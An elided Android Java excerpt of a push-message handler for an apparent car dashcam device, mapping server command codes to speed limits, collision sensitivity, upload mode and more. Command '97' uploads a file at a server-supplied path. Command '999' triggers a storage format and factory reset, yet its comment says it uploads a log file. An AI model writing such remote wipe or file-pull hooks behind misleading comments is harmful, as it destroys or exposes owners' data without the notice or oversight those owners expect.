...
public class PushIntentService extends GTIntentService {
               ...
               if(dto == null || dto.getCmdType()==null || dto.getCmdType().trim().equals("")){
                   ...
                   switch (dto.getCmdType()){
                       case "01"://01：超速设定 02:灵敏度设定(急加速灵敏度)   11:拍视频 12:拍图片   20 碰撞灵敏度
                           ...
                           CarApplication.getApplication().setCarSpeed(s);
                           break;
                       ...
                       case "20"://碰撞灵敏度
                           ...
                           if(dto.getCmd()==null || dto.getCmd().equals("00")){
                               intent.putExtra("param", APIReceive.CollisionSensitivityLow);
                           }else if(dto.getCmd()!=null && dto.getCmd().equals("10")){
                               intent.putExtra("param", APIReceive.CollisionSensitivityNormal);
                           }else if(dto.getCmd()!=null && dto.getCmd().equals("20")){
                               intent.putExtra("param", APIReceive.CollisionSensitivityHigh);
                           }else{
                               intent.putExtra("param", APIReceive.CollisionSensitivityLow);
                           }
                           sendBroadcast(intent);
                       ...
                       case "50"://设置上传模式
                           if(dto.getCmd()!=null && dto.getCmd().equals("10")){
                               CarApplication.getApplication().setCarUploadMp4Model(1);
                           }else if(dto.getCmd()!=null && dto.getCmd().equals("20")){
                               CarApplication.getApplication().setCarUploadMp4Model(0);
                           }else if(dto.getCmd()!=null && dto.getCmd().equals("30")){
                               CarApplication.getApplication().setCarUploadMp4Model(2);
                           }else{
                               CarApplication.getApplication().setCarUploadMp4Model(0);
                           }
                           break;
                       ...
                       case "97"://客户端上传指定日志文件【作为服务器检查日志使用】
                           try{
                               ...
                               ServerApiUtils.getInstance().uploadFile("97",dto.getCmd(), ServerApiUtils.fileUploadImgCallback);
                           }catch (Exception e){

                           }
                           break;
                       case "999"://客户端上传指定日志文件【作为服务器检查日志使用】
                           try{
                               Intent fintent = new Intent("com.android.internal.os.storage.FORMAT_AND_FACTORY_RESET");
                               ComponentName cn = new ComponentName("android", "com.android.internal.os.storage.ExternalStorageFormatter");
                               fintent.setComponent(cn);
    ...
    public void onReceiveOnlineState(Context context, boolean online) {
        ...
        if (online){
            ...
            PushManager.getInstance().bindAlias(getApplicationContext(), deviceId);
        }
    }
